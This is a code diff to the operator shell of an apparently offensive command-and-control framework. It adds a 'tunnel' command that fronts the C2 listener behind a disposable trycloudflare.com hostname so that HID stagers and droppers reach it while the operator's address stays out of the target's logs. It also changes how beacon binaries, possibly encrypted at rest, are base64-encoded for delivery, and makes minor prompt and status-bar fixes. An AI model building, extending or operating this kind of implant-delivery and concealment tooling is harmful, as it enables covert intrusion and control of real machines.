@@ -175,6 +175,9 @@ class C2Shell(cmd.Cmd):
         self.active_beacon = None
         self._intr_count = 0
         self._last_intr = 0.0
+        self._last_status_sig = None
+        from phantom.core.shell.ui import build_prompt
+        self.prompt = build_prompt("C2", depth=2)
     def preloop(self):
         from datetime import datetime as _dt
         if not getattr(session, "engagement_started", None):
@@ -186,23 +189,36 @@ class C2Shell(cmd.Cmd):
         console.print()
 
     def postcmd(self, stop, line):
+        from phantom.core.shell.ui import build_prompt
+
+        status_color = ""
         if self.active_beacon:
             beacons = c2_state.get_beacons()
             info = beacons.get(self.active_beacon, {})
             last_seen_str = info.get("last_seen", "")
-            
-            status_color = "\033[31m" # Red
+
+            status_color = "\033[31m"  # red: gone or never checked in
             if last_seen_str:
-                last_seen_dt = datetime.fromisoformat(last_seen_str)
-                diff = (datetime.now() - last_seen_dt).total_seconds()
-                if diff < 15: status_color = "\033[32m" # Green
-                elif diff < 60: status_color = "\033[33m" # Yellow
-            
-            self.prompt = f"\033[1;35mC2\033[0m ({status_color}{self.active_beacon}\033[0m) > "
-        else:
-            self.prompt = "\033[1;35mC2\033[0m > "
-        # Same live status bar + faded context hint as the main shell
-        if line.strip():
+                try:
+                    last_seen_dt = datetime.fromisoformat(last_seen_str)
+                    diff = (datetime.now() - last_seen_dt).total_seconds()
+                    if diff < 15:
+                        status_color = "\033[32m"   # green: live
+                    elif diff < 60:
+                        status_color = "\033[33m"   # yellow: quiet
+                except (ValueError, TypeError):
+                    pass
+        self.prompt = build_prompt("C2", depth=2, status=self.active_beacon or "",
+                                   status_color=status_color)
+        # Same live status bar + faded context hint as the main shell — but
+        # only when something in it actually moved (see the main shell's
+        # postcmd: redrawing it after every command buried the output).
+        sig = (self.active_beacon,
+               len(c2_state.get_beacons()),
+               bool(server_instance.thread and server_instance.thread.is_alive()),
+               session.target or "")
+        if line.strip() and sig != self._last_status_sig:
+            self._last_status_sig = sig
             try:
                 console.print(_c2_separator())
                 console.print(_c2_status_bar())
@@ -328,6 +344,88 @@ class C2Shell(cmd.Cmd):
         else:
             notifier.error("Usage: listeners start [port] [host] [use_ssl] | listeners stop")
 
+    def do_tunnel(self, arg):
+        """tunnel [start [port]|install|stop] - Public hop for delivery (c2.front).
+
+        `tunnel start` publishes the listener on a throwaway
+        `*.trycloudflare.com` hostname, sets `c2.front` to it, and leaves the
+        HID stager / dropper building against that hostname instead of this
+        box's IP. cloudflared runs HERE, outbound only: the target needs no
+        agent, no tailnet and no configuration — it just makes an HTTPS
+        request to Cloudflare's edge. Our address never appears in the typed
+        string, in the target's logs or in its connection table.
+
+        The listener is restarted as plain HTTP on loopback when needed: the
+        edge terminates TLS with a certificate it owns and forwards HTTP to
+        us, so an HTTPS listener behind a tunnel can never be reached.
+        """
+        from phantom.utils import tunnel as tn
+
+        parts = (arg or "").split()
+        action = parts[0].lower() if parts else "status"
+
+        if action == "install":
+            notifier.info("Downloading cloudflared (Cloudflare's own release)...")
+            path, err = tn.install()
+            if not path:
+                notifier.error(err)
+                notifier.info("Manual alternative: set PHANTOM_CLOUDFLARED to "
+                              "a cloudflared binary you already have.")
+                return
+            notifier.success(f"cloudflared installed: {path}")
+            return
+
+        if action in ("stop", "off"):
+            tn.active().stop()
+            tn.clear_front()
+            notifier.success("Tunnel stopped; c2.front cleared (artefacts use "
+                             "the listener address again).")
+            return
+
+        if action == "start":
+            port = 0
+            if len(parts) > 1:
+                try:
+                    port = int(parts[1])
+                except ValueError:
+                    notifier.error(f"not a port: {parts[1]}")
+                    return
+            # ONE implementation, shared with the API's POST /api/c2/tunnel:
+            # listener restart, mTLS downgrade, tunnel, front. Two copies of
+            # this sequence would eventually disagree about what a published
+            # C2 is.
+            result = tn.publish(port)
+            for line in result.get("messages", []):
+                (notifier.info if result.get("ok") else notifier.error)(line)
+            if not result.get("ok"):
+                return
+            notifier.success(f"Published: {result['url']}")
+            try:
+                from phantom.utils.network import c2_endpoint_status
+                ep = c2_endpoint_status()
+                notifier.info(f"Beacons will dial {ep.url} (listener kept on "
+                              f"{result['listener']}, loopback).")
+            except Exception:
+                pass
+            return
+
+        # default: status
+        tun = tn.active()
+        front = tn.current_front()
+        state = "UP" if tun.running() else "DOWN"
+        notifier.info(f"Tunnel: {state}"
+                      + (f" — {tun.public_url}" if tun.public_url else ""))
+        # Built OUTSIDE the f-string on purpose: an f-string delimited by "
+        # cannot contain a " inside its expression, and that is how this
+        # line shipped as a SyntaxError that made `c2` uncallable.
+        shown = front or "(not set — artefacts carry the listener address)"
+        notifier.info(f"c2.front: {shown}")
+        if tun.running() and not tun.public_url:
+            notifier.info(f"cloudflared: {tun.tail()}")
+        # Brackets are RICH MARKUP: an unescaped `[port]` is parsed as a tag
+        # and swallowed, which is how this line shipped as "tunnel start  |".
+        notifier.info("Usage: tunnel start \[port] | tunnel install | tunnel stop")
+
     def do_certs(self, arg):
         """certs [status|uninstall] - Inspect or remove the TLS certificate pair."""
         action = arg.strip().lower()
@@ -351,7 +449,11 @@ class C2Shell(cmd.Cmd):
             files = [path for pattern in patterns
                      for path in glob.glob(os.path.join(cert_dir, pattern))]
             for f in sorted(set(files)):
-                notifier.info(f"[{os.path.basename(f)}] ({os.path.getsize(f)} bytes)")
+                # same trap as above: `[server.crt]` was rendered as a tag, so
+                # every certificate printed as a bare "(1419 bytes)" with no
+                # name — an inventory nobody can act on.
+                name = os.path.basename(f)
+                notifier.info(f"\\[{name}] ({os.path.getsize(f)} bytes)")
             notifier.success("TLS certificates present. Listener may run HTTPS.")
         else:
             notifier.warn("No TLS certificates. Start an HTTPS listener to auto-generate them.")
@@ -594,6 +696,11 @@ class C2Shell(cmd.Cmd):
         self.active_beacon = resolved
         notifier.success(f"Interacting with beacon {resolved}")
         console.print("[dim]Type 'beacon-help' for agent commands. Use 'results' after tasks complete.[/dim]")
+
+    def do_where(self, arg):
+        """where - Print the current layer, target and scope (same as the shell)"""
+        from phantom.core.shell.ui import layer_line
+        console.print(layer_line("C2", depth=2), markup=False)
 
     def do_back(self, arg):
         """back - return to main C2 shell from interaction mode"""
@@ -891,12 +998,14 @@ class C2Shell(cmd.Cmd):
                 return
             beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT[platform])
         
-        if not os.path.exists(beacon_path):
+        # The builder may have sealed the artefact at rest: `present`/
+        # `payload` understand both the plaintext and the .enc form.
+        from phantom.utils import beacon_artifacts
+        if not beacon_artifacts.present(beacon_path):
             notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate {platform}' first.")
             return
-            
-        with open(beacon_path, "rb") as f:
-            b64 = base64.b64encode(f.read()).decode()
+
+        b64 = base64.b64encode(beacon_artifacts.payload(beacon_path) or b"").decode()
             
         from rich.console import Console
         from rich.panel import Panel
